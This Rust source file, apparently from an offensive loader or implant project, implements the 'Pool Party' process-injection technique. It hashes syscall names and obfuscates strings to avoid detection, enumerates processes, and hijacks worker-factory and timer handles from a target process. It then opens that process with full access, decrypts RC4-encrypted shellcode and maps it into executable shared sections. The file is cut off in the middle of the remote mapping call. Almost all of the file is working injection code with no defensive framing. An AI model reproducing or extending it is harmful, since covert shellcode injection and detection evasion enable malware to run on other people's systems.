#![allow(non_snake_case)]
#![allow(non_camel_case_types)]

use core::ffi::c_void;
use crate::hash_macro::HashSeed;
use crate::{debug_println, hash_it, obfstr, syscall, utf16_str};
use const_random::const_random;
extern crate alloc;

// ========================================
// Windows Structure Definitions
// ========================================

/// UNICODE_STRING structure
#[repr(C)]
pub struct UNICODE_STRING {
    pub Length: u16,
    pub MaximumLength: u16,
    pub Buffer: *mut u16,
}

/// OBJECT_ATTRIBUTES structure
#[repr(C)]
pub struct OBJECT_ATTRIBUTES {
    pub Length: u32,
    pub RootDirectory: *mut c_void,
    pub ObjectName: *mut UNICODE_STRING,
    pub Attributes: u32,
    pub SecurityDescriptor: *mut c_void,
    pub SecurityQualityOfService: *mut c_void,
}

/// CLIENT_ID structure
#[repr(C)]
pub struct CLIENT_ID {
    pub UniqueProcess: *mut c_void,
    pub UniqueThread: *mut c_void,
}

/// PS_CREATE_INFO structure for NtCreateUserProcess
#[repr(C)]
pub struct PS_CREATE_INFO {
    pub Size: usize,
    pub State: u32,  // PS_CREATE_STATE enum
    pub u: PS_CREATE_INFO_UNION,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub union PS_CREATE_INFO_UNION {
    pub InitFlags: u32,
    pub InitState: PS_CREATE_INITIAL_STATE,
    pub SuccessState: PS_CREATE_SUCCESS_STATE,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct PS_CREATE_INITIAL_STATE {
    pub InitFlags: u32,
    pub WriteOutputOnExit: u32,
    pub DetectManifest: u32,
    pub IFEOSkipDebugger: u32,
    pub IFEODoNotPropagateKeyState: u32,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct PS_CREATE_SUCCESS_STATE {
    pub OutputFlags: u32,
    pub FileHandle: *mut c_void,
    pub SectionHandle: *mut c_void,
    pub UserProcessParametersNative: u64,
    pub UserProcessParametersWow64: u32,
    pub CurrentParameterFlags: u32,
    pub PebAddressNative: u64,
    pub PebAddressWow64: u32,
    pub ManifestAddress: u64,
    pub ManifestSize: u32,
}

/// PS_ATTRIBUTE_LIST for NtCreateUserProcess
#[repr(C)]
pub struct PS_ATTRIBUTE_LIST {
    pub TotalLength: usize,
    pub Attributes: [PS_ATTRIBUTE; 1],
}

#[repr(C)]
pub struct PS_ATTRIBUTE {
    pub Attribute: usize,
    pub Size: usize,
    pub Value: usize,
    pub ReturnLength: *mut usize,
}

// PS_ATTRIBUTE flags
pub const PS_ATTRIBUTE_IMAGE_NAME: usize = 0x00020005;

// PS_CREATE_INFO state constants
pub const PS_CREATE_INITIAL_STATE: u32 = 0;

/// SYSTEM_PROCESS_INFORMATION structure (for process enumeration)
#[repr(C)]
pub struct SYSTEM_PROCESS_INFORMATION {
    pub NextEntryOffset: u32,
    pub NumberOfThreads: u32,
    pub Reserved1: [u8; 48],
    pub ImageName: UNICODE_STRING,
    pub BasePriority: i32,
    pub UniqueProcessId: usize,
    pub Reserved2: usize,
    pub HandleCount: u32,
    pub SessionId: u32,
    pub Reserved3: usize,
    pub PeakVirtualSize: usize,
    pub VirtualSize: usize,
    pub Reserved4: u32,
    pub PeakWorkingSetSize: usize,
    pub WorkingSetSize: usize,
    pub Reserved5: usize,
    pub QuotaPagedPoolUsage: usize,
    pub Reserved6: usize,
    pub QuotaNonPagedPoolUsage: usize,
    pub PagefileUsage: usize,
    pub PeakPagefileUsage: usize,
    pub PrivatePageCount: usize,
    pub Reserved7: [i64; 6],
}

// SystemInformationClass values
pub const SYSTEM_PROCESS_INFORMATION_CLASS: u32 = 5;

// System handle information structures
#[repr(C)]
pub struct SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    pub ProcessId: u16,
    pub CreatorBackTraceIndex: u16,
    pub ObjectTypeIndex: u8,
    pub HandleAttributes: u8,
    pub HandleValue: u16,
    pub Object: *mut c_void,
    pub GrantedAccess: u32,
}

#[repr(C)]
pub struct SYSTEM_HANDLE_INFORMATION {
    pub NumberOfHandles: u32,
    pub Handles: [SYSTEM_HANDLE_TABLE_ENTRY_INFO; 1],
}

// ========================================
// Thread Pool Structures
// ========================================

/// TP_CALLBACK_INSTANCE (opaque)
#[repr(C)]
pub struct TP_CALLBACK_INSTANCE {
    _opaque: [u8; 0],
}

/// TP_TIMER (opaque pointer)
pub type PTP_TIMER = *mut c_void;

/// TP_CALLBACK_ENVIRON_V3 structure
#[repr(C)]
pub struct TP_CALLBACK_ENVIRON_V3 {
    pub Version: u32,
    pub Pool: *mut c_void,
    pub CleanupGroup: *mut c_void,
    pub CleanupGroupCancelCallback: *mut c_void,
    pub RaceDll: *mut c_void,
    pub ActivationContext: *mut c_void,
    pub FinalizationCallback: *mut c_void,
    pub u: TP_CALLBACK_ENVIRON_U,
    pub CallbackPriority: u32,
    pub Size: u32,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub union TP_CALLBACK_ENVIRON_U {
    pub Flags: u32,
    pub s: TP_CALLBACK_ENVIRON_S,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct TP_CALLBACK_ENVIRON_S {
    pub _bitfield: u32,
}

pub type TP_CALLBACK_ENVIRON = TP_CALLBACK_ENVIRON_V3;
pub type PTP_CALLBACK_ENVIRON = *mut TP_CALLBACK_ENVIRON;

/// Timer callback function type
pub type PTP_TIMER_CALLBACK = unsafe extern "system" fn(
    Instance: *mut TP_CALLBACK_INSTANCE,
    Context: *mut c_void,
    Timer: PTP_TIMER,
);


// ========================================
// Internal Thread Pool Structures (undocumented)
// ========================================
// These structures are reverse-engineered from Windows internals
// Offsets may vary by Windows version - these are for Windows 10/11 x64

#[repr(C)]
#[derive(Copy, Clone)]
pub struct LIST_ENTRY {
    pub Flink: *mut LIST_ENTRY,
    pub Blink: *mut LIST_ENTRY,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct RTL_BALANCED_NODE {
    // Children is a union of [Left, Right] in Windows (not separate fields!)
    // Children[0] = Left, Children[1] = Right
    pub Children: [*mut RTL_BALANCED_NODE; 2],  // 16 bytes
    pub ParentValue: usize,                      // 8 bytes (includes flags in low bits)
    // Total: 24 bytes
}

// impl RTL_BALANCED_NODE {
//     pub fn new() -> Self {
//         Self {
//             Children: [core::ptr::null_mut(); 2],
//             ParentValue: 0,
//         }
//     }
// }

#[repr(C)]
pub struct TP_CLEANUP_GROUP_MEMBER {
    _padding1: [u8; 0x90],              // Padding to Pool offset (144 bytes)
    pub Pool: *mut FULL_TP_POOL,       // Offset 0x90 (from SafeBreach output)
    _padding2: [u8; 0x30],              // Remaining padding (0xC8 - 0x90 - 0x8 = 0x30 = 48 bytes)
}

#[repr(C)]
pub struct TP_WORK {
    pub CleanupGroupMember: TP_CLEANUP_GROUP_MEMBER,  // 0xC8 = 200 bytes
    _padding: [u8; 0x28],                              // 0xF0 - 0xC8 = 0x28 = 40 bytes
}

#[repr(C)]
pub struct RTL_BALANCED_NODE_WITHKEY {
    // This is actually TPP_PH_LINKS from SafeBreach
    pub Siblings: LIST_ENTRY,      // 16 bytes (Flink, Blink)
    pub Children: LIST_ENTRY,       // 16 bytes (Flink, Blink) - this is what we use
    pub Key: i64,                   // 8 bytes
    // Total: 40 bytes
}

// Alias for clarity
pub type TPP_PH_LINKS = RTL_BALANCED_NODE_WITHKEY;

// #[repr(C)]
// pub struct RTL_RB_TREE {
//     pub Root: *mut RTL_BALANCED_NODE,
//     pub Min: *mut RTL_BALANCED_NODE,
// }

#[repr(C)]
pub struct TP_TIMER_SUBQUEUE {
    // Based on IDA analysis: WindowStart at 0x80, WindowEnd at 0x88 (8 bytes apart)
    // These are just Root pointers, not full RTL_RB_TREE structures
    pub WindowStart: *mut RTL_BALANCED_NODE,  // Root pointer only
    pub WindowEnd: *mut RTL_BALANCED_NODE,    // Root pointer only
}

#[repr(C)]
pub struct TP_TIMER_QUEUE {
    pub AbsoluteQueue: TP_TIMER_SUBQUEUE,
    pub RelativeQueue: TP_TIMER_SUBQUEUE,
}

#[repr(C)]
pub struct FULL_TP_POOL {
    _padding_before_timer_queue: [u8; 0x80], // Padding to TimerQueue.AbsoluteQueue offset
    pub TimerQueue: TP_TIMER_QUEUE,
    _padding_after: [u8; 0xE0], // Rest of structure (0x160 - 0x80 = 0xE0)
}

#[repr(C)]
pub struct FULL_TP_TIMER {
    pub Work: TP_WORK,                        // 0x00 - 0xF0 (240 bytes)
    pub Lock: i64,                            // 0xF0 - 0xF8 (RTL_SRWLOCK = 8 bytes)
    pub WindowEndLinks: RTL_BALANCED_NODE_WITHKEY,  // 0xF8 - 0x120 (40 bytes)
    pub WindowStartLinks: RTL_BALANCED_NODE_WITHKEY, // 0x120 - 0x148 (40 bytes)
    pub DueTime: i64,                         // 0x148 - 0x150 (8 bytes)
    pub _padding: [u8; 0x18],                 // 0x150 - 0x168 (24 bytes to reach 360 total)
}

// Worker Factory structures
#[repr(C)]
pub struct WORKER_FACTORY_BASIC_INFORMATION {
    pub Timeout: i64,              // LARGE_INTEGER
    pub RetryTimeout: i64,         // LARGE_INTEGER
    pub IdleTimeout: i64,          // LARGE_INTEGER
    pub Paused: u8,                // BOOLEAN
    pub TimerSet: u8,              // BOOLEAN
    pub QueuedToExWorker: u8,      // BOOLEAN
    pub MayCreate: u8,             // BOOLEAN
    pub CreateInProgress: u8,      // BOOLEAN
    pub InsertedIntoQueue: u8,     // BOOLEAN
    pub Shutdown: u8,              // BOOLEAN
    // Compiler adds 1 byte padding here automatically
    pub BindingCount: u32,         // ULONG
    pub ThreadMinimum: u32,        // ULONG
    pub ThreadMaximum: u32,        // ULONG
    pub PendingWorkerCount: u32,   // ULONG
    pub WaitingWorkerCount: u32,   // ULONG
    pub TotalWorkerCount: u32,     // ULONG
    pub ReleaseCount: u32,         // ULONG
    pub InfiniteWaitGoal: i64,     // LONGLONG
    pub StartRoutine: *mut c_void, // PVOID
    pub StartParameter: *mut c_void, // PVOID - TP_POOL pointer!
    pub ProcessId: *mut c_void,    // HANDLE
    pub StackReserve: usize,       // SIZE_T
    pub StackCommit: usize,        // SIZE_T
    pub LastThreadCreationStatus: i32, // NTSTATUS
}

// T2_SET_PARAMETERS for NtSetTimer2
#[repr(C)]
pub struct T2_SET_PARAMETERS {
    pub Version: u32,
    pub Reserved: u32,
    pub NoWakeTolerance: i64,
}

// Structures for NtQueryObject
#[repr(C)]
pub struct OBJECT_TYPE_INFORMATION {
    pub TypeName: UNICODE_STRING,
    pub TotalNumberOfObjects: u32,
    pub TotalNumberOfHandles: u32,
    pub TotalPagedPoolUsage: u32,
    pub TotalNonPagedPoolUsage: u32,
    pub TotalNamePoolUsage: u32,
    pub TotalHandleTableUsage: u32,
    pub HighWaterNumberOfObjects: u32,
    pub HighWaterNumberOfHandles: u32,
    pub HighWaterPagedPoolUsage: u32,
    pub HighWaterNonPagedPoolUsage: u32,
    pub HighWaterNamePoolUsage: u32,
    pub HighWaterHandleTableUsage: u32,
    pub InvalidAttributes: u32,
    pub GenericMapping: [u32; 4],
    pub ValidAccessMask: u32,
    pub SecurityRequired: u8,
    pub MaintainHandleCount: u8,
    pub TypeIndex: u16,
    pub ReservedByte: u8,
    pub PoolType: u32,
    pub DefaultPagedPoolCharge: u32,
    pub DefaultNonPagedPoolCharge: u32,
}

// Structures for ProcessHandleInformation
#[repr(C)]
pub struct PROCESS_HANDLE_TABLE_ENTRY_INFO {
    pub HandleValue: isize,
    pub HandleCount: usize,
    pub PointerCount: usize,
    pub GrantedAccess: u32,
    pub ObjectTypeIndex: u32,
    pub HandleAttributes: u32,
    pub Reserved: u32,
}

#[repr(C)]
pub struct PROCESS_HANDLE_SNAPSHOT_INFORMATION {
    pub NumberOfHandles: usize,
    pub Reserved: usize,
    pub Handles: PROCESS_HANDLE_TABLE_ENTRY_INFO,
}

// ========================================
// Syscall Function Type Definitions
// ========================================

pub type NtOpenProcessFn = unsafe extern "system" fn(
    ProcessHandle: *mut isize,
    DesiredAccess: u32,
    ObjectAttributes: *mut OBJECT_ATTRIBUTES,
    ClientId: *mut CLIENT_ID,
) -> i32;

pub type NtQuerySystemInformationFn = unsafe extern "system" fn(
    SystemInformationClass: u32,
    SystemInformation: *mut c_void,
    SystemInformationLength: u32,
    ReturnLength: *mut u32,
) -> i32;

pub type NtAllocateVirtualMemoryFn = unsafe extern "system" fn(
    ProcessHandle: isize,
    BaseAddress: *mut *mut c_void,
    ZeroBits: usize,
    RegionSize: *mut usize,
    AllocationType: u32,
    Protect: u32,
) -> i32;

pub type NtFreeVirtualMemoryFn = unsafe extern "system" fn(
    ProcessHandle: isize,
    BaseAddress: *mut *mut c_void,
    RegionSize: *mut usize,
    FreeType: u32,
) -> i32;

pub type NtWriteVirtualMemoryFn = unsafe extern "system" fn(
    ProcessHandle: isize,
    BaseAddress: *mut c_void,
    Buffer: *const c_void,
    NumberOfBytesToWrite: usize,
    NumberOfBytesWritten: *mut usize,
) -> i32;

// WARN Needed for most advanced version
// pub type NtReadVirtualMemoryFn = unsafe extern "system" fn(
//     ProcessHandle: isize,
//     BaseAddress: *mut c_void,
//     Buffer: *mut c_void,
//     NumberOfBytesToRead: usize,
//     NumberOfBytesRead: *mut usize,
// ) -> i32;

// pub type NtProtectVirtualMemoryFn = unsafe extern "system" fn(
//     ProcessHandle: isize,
//     BaseAddress: *mut *mut c_void,
//     NumberOfBytesToProtect: *mut usize,
//     NewAccessProtection: u32,
//     OldAccessProtection: *mut u32,
// ) -> i32;

pub type NtCreateSectionFn = unsafe extern "system" fn(
    SectionHandle: *mut isize,
    DesiredAccess: u32,
    ObjectAttributes: *mut OBJECT_ATTRIBUTES,
    MaximumSize: *mut i64,
    SectionPageProtection: u32,
    AllocationAttributes: u32,
    FileHandle: isize,
) -> i32;

pub type NtMapViewOfSectionFn = unsafe extern "system" fn(
    SectionHandle: isize,
    ProcessHandle: isize,
    BaseAddress: *mut *mut c_void,
    ZeroBits: usize,
    CommitSize: usize,
    SectionOffset: *mut i64,
    ViewSize: *mut usize,
    InheritDisposition: u32,
    AllocationType: u32,
    Win32Protect: u32,
) -> i32;

// TODO use it for good cleanup
// pub type NtUnmapViewOfSectionFn = unsafe extern "system" fn(
//     ProcessHandle: isize,
//     BaseAddress: *mut c_void,
// ) -> i32;

pub type TpAllocTimerFn = unsafe extern "system" fn(
    Callback: PTP_TIMER_CALLBACK,
    Context: *mut c_void,
    Environment: PTP_CALLBACK_ENVIRON,
) -> PTP_TIMER;


// pub type TpReleaseTimerFn = unsafe extern "system" fn(
//     Timer: PTP_TIMER,
// );

pub type NtQueryInformationWorkerFactoryFn = unsafe extern "system" fn(
    WorkerFactoryHandle: isize,
    WorkerFactoryInformationClass: u32,
    WorkerFactoryInformation: *mut c_void,
    WorkerFactoryInformationLength: u32,
    ReturnLength: *mut u32,
) -> i32;

pub type NtSetTimer2Fn = unsafe extern "system" fn(
    TimerHandle: isize,
    DueTime: *const i64,
    Period: *const i64,
    Parameters: *const T2_SET_PARAMETERS,
) -> i32;

pub type NtDuplicateObjectFn = unsafe extern "system" fn(
    SourceProcessHandle: isize,
    SourceHandle: isize,
    TargetProcessHandle: isize,
    TargetHandle: *mut isize,
    DesiredAccess: u32,
    HandleAttributes: u32,
    Options: u32,
) -> i32;

pub type NtQueryInformationProcessFn = unsafe extern "system" fn(
    ProcessHandle: isize,
    ProcessInformationClass: u32,
    ProcessInformation: *mut c_void,
    ProcessInformationLength: u32,
    ReturnLength: *mut u32,
) -> i32;

pub type NtQueryObjectFn = unsafe extern "system" fn(
    Handle: isize,
    ObjectInformationClass: u32,
    ObjectInformation: *mut c_void,
    ObjectInformationLength: u32,
    ReturnLength: *mut u32,
) -> i32;

pub type NtCloseFn = unsafe extern "system" fn(
    Handle: isize,
) -> i32;

pub type NtCreateUserProcessFn = unsafe extern "system" fn(
    ProcessHandle: *mut isize,
    ThreadHandle: *mut isize,
    ProcessDesiredAccess: u32,
    ThreadDesiredAccess: u32,
    ProcessObjectAttributes: *mut OBJECT_ATTRIBUTES,
    ThreadObjectAttributes: *mut OBJECT_ATTRIBUTES,
    ProcessFlags: u32,
    ThreadFlags: u32,
    ProcessParameters: *mut c_void, // RTL_USER_PROCESS_PARAMETERS
    CreateInfo: *mut PS_CREATE_INFO,
    AttributeList: *mut PS_ATTRIBUTE_LIST,
) -> i32;

pub type RtlCreateProcessParametersExFn = unsafe extern "system" fn(
    ProcessParameters: *mut *mut c_void, // RTL_USER_PROCESS_PARAMETERS
    ImagePathName: *mut UNICODE_STRING,
    DllPath: *mut UNICODE_STRING,
    CurrentDirectory: *mut UNICODE_STRING,
    CommandLine: *mut UNICODE_STRING,
    Environment: *mut c_void,
    WindowTitle: *mut UNICODE_STRING,
    DesktopInfo: *mut UNICODE_STRING,
    ShellInfo: *mut UNICODE_STRING,
    RuntimeData: *mut UNICODE_STRING,
    Flags: u32,
) -> i32;

pub type RtlInitUnicodeStringFn = unsafe extern "system" fn(
    DestinationString: *mut UNICODE_STRING,
    SourceString: *const u16,
);

// ========================================
// Constants
// ========================================

pub const PROCESS_ALL_ACCESS: u32 = 0x001F0FFF;

pub const MEM_COMMIT: u32 = 0x00001000;
pub const MEM_RESERVE: u32 = 0x00002000;

pub const PAGE_EXECUTE_READ: u32 = 0x20;
pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;
pub const PAGE_READWRITE: u32 = 0x04;

// Section constants
pub const SECTION_ALL_ACCESS: u32 = 0x000F001F;
pub const SEC_COMMIT: u32 = 0x08000000;


// ViewUnmap constants

pub const VIEW_UNMAP: u32 = 2;

// ========================================
// Hash definitions for syscalls
// ========================================

pub const NT_OPEN_PROCESS: HashSeed = hash_it!("NtOpenProcess");
pub const NT_QUERY_SYSTEM_INFORMATION: HashSeed = hash_it!("NtQuerySystemInformation");
pub const NT_ALLOCATE_VIRTUAL_MEMORY: HashSeed = hash_it!("NtAllocateVirtualMemory");
pub const NT_FREE_VIRTUAL_MEMORY: HashSeed = hash_it!("NtFreeVirtualMemory");
pub const NT_WRITE_VIRTUAL_MEMORY: HashSeed = hash_it!("NtWriteVirtualMemory");
// pub const NT_READ_VIRTUAL_MEMORY: HashSeed = hash_it!("NtReadVirtualMemory");
// pub const NT_PROTECT_VIRTUAL_MEMORY: HashSeed = hash_it!("NtProtectVirtualMemory");
pub const NT_CREATE_SECTION: HashSeed = hash_it!("NtCreateSection");
pub const NT_MAP_VIEW_OF_SECTION: HashSeed = hash_it!("NtMapViewOfSection");
// pub const NT_UNMAP_VIEW_OF_SECTION: HashSeed = hash_it!("NtUnmapViewOfSection");

// Thread pool APIs are exported from ntdll but aren't syscalls - they're regular functions
// We'll need to get them via GetProcAddress or similar
pub const TP_ALLOC_TIMER: HashSeed = hash_it!("TpAllocTimer");
pub const TP_SET_TIMER: HashSeed = hash_it!("TpSetTimer");
// pub const TP_RELEASE_TIMER: HashSeed = hash_it!("TpReleaseTimer");

// kernel32 thread pool APIs (high-level, safer to call)
pub const CREATE_THREADPOOL_TIMER: HashSeed = hash_it!("CreateThreadpoolTimer");
pub const SET_THREADPOOL_TIMER: HashSeed = hash_it!("SetThreadpoolTimer");

// New syscalls for proper Pool Party implementation
pub const NT_QUERY_INFORMATION_WORKER_FACTORY: HashSeed = hash_it!("NtQueryInformationWorkerFactory");
pub const NT_SET_TIMER2: HashSeed = hash_it!("NtSetTimer2");
pub const NT_CREATE_USER_PROCESS: HashSeed = hash_it!("NtCreateUserProcess");
pub const RTL_CREATE_PROCESS_PARAMETERS_EX: HashSeed = hash_it!("RtlCreateProcessParametersEx");
pub const RTL_INIT_UNICODE_STRING: HashSeed = hash_it!("RtlInitUnicodeString");
pub const NT_DUPLICATE_OBJECT: HashSeed = hash_it!("NtDuplicateObject");
pub const NT_QUERY_INFORMATION_PROCESS: HashSeed = hash_it!("NtQueryInformationProcess");
pub const NT_QUERY_OBJECT: HashSeed = hash_it!("NtQueryObject");
pub const NT_CLOSE: HashSeed = hash_it!("NtClose");

// System handle information
pub const SYSTEM_HANDLE_INFORMATION_CLASS: u32 = 16;

// Process information classes
pub const PROCESS_HANDLE_INFORMATION_CLASS: u32 = 51; // ProcessHandleInformation

// Object information classes
pub const OBJECT_TYPE_INFORMATION_CLASS: u32 = 2; // ObjectTypeInformation

// Worker Factory information class
pub const WORKER_FACTORY_BASIC_INFORMATION_CLASS: u32 = 7;

// Handle type constants (note: these vary by Windows version, prefer string comparison)
pub const OBJECT_TYPE_WORKER_FACTORY: u32 = 0x002D; // TpWorkerFactoryObjectType

// Duplicate handle options
pub const DUPLICATE_SAME_ACCESS: u32 = 0x00000002;

// ========================================
// Pool Party Implementation
// ========================================

/// Helper function to get a function address from ntdll by hash
/// This is for regular exports (like TpAllocTimer), not syscalls
pub unsafe fn get_ntdll_export(hash_seed: HashSeed) -> Option<*mut c_void> {
    unsafe {
        let ntdll_handle = crate::syscall::NTDLL_HANDLE;
        if ntdll_handle == 0 {
            debug_println!("[-] NTDLL not initialized");
            return None;
        }

        let (func_ptr, _ssn) = crate::syscall::getproc_address_ssn(ntdll_handle, hash_seed);
        func_ptr.map(|f| f as *mut c_void)
    }
}

/// Helper function to get kernel32.dll base address
pub unsafe fn get_kernel32_handle() -> Option<usize> {
    use crate::syscall::get_module_handle;

    let kernel32_hash = hash_it!("kernel32.dll");
    let kernel32_info = get_module_handle(kernel32_hash)?;
    let (base_address, _end_address) = kernel32_info;
    Some(base_address)
}

/// Helper function to get a function address from kernel32 by hash
pub unsafe fn get_kernel32_export(hash_seed: HashSeed) -> Option<*mut c_void> {
    let kernel32_handle = unsafe { get_kernel32_handle()? };
    let (func_ptr, _ssn) = crate::syscall::getproc_address_ssn(kernel32_handle, hash_seed);
    func_ptr.map(|f| f as *mut c_void)
}

/// Find a specific process by name
/// Returns the PID if found, None otherwise
pub unsafe fn find_process_by_name(process_name: &str) -> Option<u32> {
    let mut buffer_size: u32 = 1024 * 512;
    let mut buffer = alloc::vec![0u8; buffer_size as usize];
    let mut return_length: u32 = 0;

    let mut status = syscall!(
        NT_QUERY_SYSTEM_INFORMATION,
        NtQuerySystemInformationFn,
        SYSTEM_PROCESS_INFORMATION_CLASS,
        buffer.as_mut_ptr() as *mut c_void,
        buffer_size,
        &mut return_length
    );

    if status == 0xC0000004u32 as i32 {
        buffer_size = return_length + 4096;
        buffer = alloc::vec![0u8; buffer_size as usize];

        status = syscall!(
            NT_QUERY_SYSTEM_INFORMATION,
            NtQuerySystemInformationFn,
            SYSTEM_PROCESS_INFORMATION_CLASS,
            buffer.as_mut_ptr() as *mut c_void,
            buffer_size,
            &mut return_length
        );
    }

    if status != 0 {
        return None;
    }

    // Iterate through process list
    let mut current_ptr = buffer.as_ptr() as *const SYSTEM_PROCESS_INFORMATION;

    loop {
        let current = unsafe { &*current_ptr };

        // Get process name from UNICODE_STRING
        if !current.ImageName.Buffer.is_null() && current.ImageName.Length > 0 {
            let name_len = (current.ImageName.Length / 2) as usize;  // Convert bytes to u16 count
            let name_slice = unsafe {
                core::slice::from_raw_parts(
                    current.ImageName.Buffer,
                    name_len
                )
            };

            // Convert UTF-16 to UTF-8 for comparison (simple ASCII conversion)
            let mut name_buf = alloc::vec![0u8; name_len];
            for (i, &c) in name_slice.iter().enumerate() {
                name_buf[i] = if c < 128 { c as u8 } else { b'?' };
            }

            if let Ok(current_name) = core::str::from_utf8(&name_buf) {
                if current_name.eq_ignore_ascii_case(process_name) {
                    return Some(current.UniqueProcessId as u32);
                }
            }
        }

        if current.NextEntryOffset == 0 {
            break;
        }

        current_ptr = (current_ptr as usize + current.NextEntryOffset as usize) as *const SYSTEM_PROCESS_INFORMATION;
    }

    None
}

// ========================================
// Pool Party Helper Functions
// ========================================

/// Generic function to hijack (duplicate) a handle by object type name
/// This is the cleanest approach - works across all Windows versions
/// Based on SafeBreach PoolParty implementation
#[inline(never)]
unsafe fn hijack_process_handle(
    process_handle: isize,
    object_type_name: &str,
) -> Option<isize> {
    let buffer_size: u32 = 1024 * 1024;
    let mut buffer = alloc::vec![0u8; buffer_size as usize];
    let mut return_length: u32 = 0;

    let status = syscall!(
        NT_QUERY_INFORMATION_PROCESS,
        NtQueryInformationProcessFn,
        process_handle,
        PROCESS_HANDLE_INFORMATION_CLASS,
        buffer.as_mut_ptr() as *mut c_void,
        buffer_size,
        &mut return_length
    );

    if status != 0 {
        return None;
    }

    let handle_snapshot = buffer.as_ptr() as *const PROCESS_HANDLE_SNAPSHOT_INFORMATION;
    let num_handles = unsafe { (*handle_snapshot).NumberOfHandles };

    // Get array of handles
    let handles_ptr = unsafe { &(*handle_snapshot).Handles as *const PROCESS_HANDLE_TABLE_ENTRY_INFO };
    let handles_slice = unsafe { core::slice::from_raw_parts(handles_ptr, num_handles) };

    for handle_entry in handles_slice.iter() {
        // Try to duplicate the handle to our process
        let mut duplicated_handle: isize = 0;

        let dup_status = syscall!(
            NT_DUPLICATE_OBJECT,
            NtDuplicateObjectFn,
            process_handle,
            handle_entry.HandleValue,
            -1isize, // Current process
            &mut duplicated_handle,
            0,
            0,
            DUPLICATE_SAME_ACCESS
        );

        if dup_status != 0 {
            continue; // Can't duplicate, skip
        }

        // Query object type - first get size
        let mut type_info_len: u32 = 0;
        let _ = syscall!(
            NT_QUERY_OBJECT,
            NtQueryObjectFn,
            duplicated_handle,
            OBJECT_TYPE_INFORMATION_CLASS,
            core::ptr::null_mut(),
            0,
            &mut type_info_len
        );

        if type_info_len == 0 || type_info_len > 1024 * 10 {
            let _ = syscall!(NT_CLOSE, NtCloseFn, duplicated_handle);
            continue;
        }

        // Get actual object type info
        let mut type_info_buffer = alloc::vec![0u8; type_info_len as usize];
        let query_status = syscall!(
            NT_QUERY_OBJECT,
            NtQueryObjectFn,
            duplicated_handle,
            OBJECT_TYPE_INFORMATION_CLASS,
            type_info_buffer.as_mut_ptr() as *mut c_void,
            type_info_len,
            core::ptr::null_mut()
        );

        if query_status == 0 {
            let type_info = type_info_buffer.as_ptr() as *const OBJECT_TYPE_INFORMATION;
            unsafe {
                if !(*type_info).TypeName.Buffer.is_null() && (*type_info).TypeName.Length > 0 {
                    let name_len = ((*type_info).TypeName.Length / 2) as usize;
                    let name_slice = core::slice::from_raw_parts(
                        (*type_info).TypeName.Buffer,
                        name_len
                    );

                    // Convert UTF-16 to ASCII
                    let mut name_buf = alloc::vec![0u8; name_len];
                    for (idx, &c) in name_slice.iter().enumerate() {
                        name_buf[idx] = if c < 128 { c as u8 } else { b'?' };
                    }

                    if let Ok(type_name) = core::str::from_utf8(&name_buf) {
                        if type_name == object_type_name {
                            return Some(duplicated_handle);
                        }
                    }
                }
            }
        }

        let _ = syscall!(NT_CLOSE, NtCloseFn, duplicated_handle);
    }

    None
}

/// Hijack Worker Factory handle from target process
unsafe fn hijack_worker_factory_handle(process_handle: isize) -> Option<isize> {
    let tp_worker_factory_str= obfstr!("TpWorkerFactory");
    unsafe { hijack_process_handle(process_handle, tp_worker_factory_str) }
}

/// Hijack Timer handle from target process
unsafe fn hijack_timer_handle(process_handle: isize) -> Option<isize> {
    let ir_timer_str = obfstr!("IRTimer");
    unsafe { hijack_process_handle(process_handle, ir_timer_str) }
}

/// Main Pool Party injection function using TP_TIMER with NtMapViewOfSection
#[inline(never)]
pub unsafe fn inject_via_tp_timer<const N: usize>(
    pid: u32,
    shellcode_encrypted: &crate::rc4::EncryptedBytes<N>,
) -> i32 {
    use core::ptr::{copy_nonoverlapping, null_mut};

    debug_println!("\n=== Starting TP_TIMER Injection ===");
    debug_println!("[*] Target PID: {}", pid);
    debug_println!("[*] Decrypting shellcode ({} bytes)...", N);

    let mut process_handle: isize = 0;
    let mut client_id = CLIENT_ID {
        UniqueProcess: pid as *mut c_void,
        UniqueThread: null_mut(),
    };
    let mut obj_attr = OBJECT_ATTRIBUTES {
        Length: core::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
        RootDirectory: null_mut(),
        ObjectName: null_mut(),
        Attributes: 0,
        SecurityDescriptor: null_mut(),
        SecurityQualityOfService: null_mut(),
    };

    let status = syscall!(
        NT_OPEN_PROCESS,
        NtOpenProcessFn,
        &mut process_handle,
        PROCESS_ALL_ACCESS,
        &mut obj_attr,
        &mut client_id
    );

    if status != 0 {
        debug_println!("[-] Failed to open process: {:#x}", status);
        return status;
    }
    debug_println!("[+] Process opened");

    // Decrypt shellcode right before injection (RC4 decryption)
    let shellcode = shellcode_encrypted.decrypt();
    debug_println!("[+] Shellcode decrypted successfully");

    let mut section_handle: isize = 0;
    let mut section_size: i64 = shellcode.len() as i64;

    let status = syscall!(
        NT_CREATE_SECTION,
        NtCreateSectionFn,
        &mut section_handle,
        SECTION_ALL_ACCESS,
        null_mut(),  // No object attributes
        &mut section_size,
        PAGE_EXECUTE_READWRITE,  // Maximum protection - allows RW and RX mappings
        SEC_COMMIT,
        0  // No file handle (anonymous section)
    );

    if status != 0 {
        debug_println!("[-] Failed to create section: {:#x}", status);
        return status;
    }

    let mut local_addr: *mut c_void = null_mut();
    let mut local_view_size: usize = 0;

    let status = syscall!(
        NT_MAP_VIEW_OF_SECTION,
        NtMapViewOfSectionFn,
        section_handle,
        -1isize,  // Current process
        &mut local_addr,
        0,  // ZeroBits
        0,  // CommitSize
        null_mut(),  // SectionOffset
        &mut local_view_size,
        VIEW_UNMAP,  // InheritDisposition
        0,  // AllocationType
        PAGE_READWRITE  // Win32Protect
    );

    if status != 0 {
        debug_println!("[-] Failed to map local section: {:#x}", status);
        return status;
    }

    unsafe {
        copy_nonoverlapping(
            shellcode.as_ptr(),
            local_addr as *mut u8,
            shellcode.len()
        );
    }
    debug_println!("[+] Shellcode copied to section");

    let mut remote_addr: *mut c_void = null_mut();
    let mut remote_view_size: usize = 0;

    let status = syscall!(
        NT_MAP_VIEW_OF_SECTION,
        NtMapViewOfSectionFn,
        section_handle,
        process_handle,  // Remote process
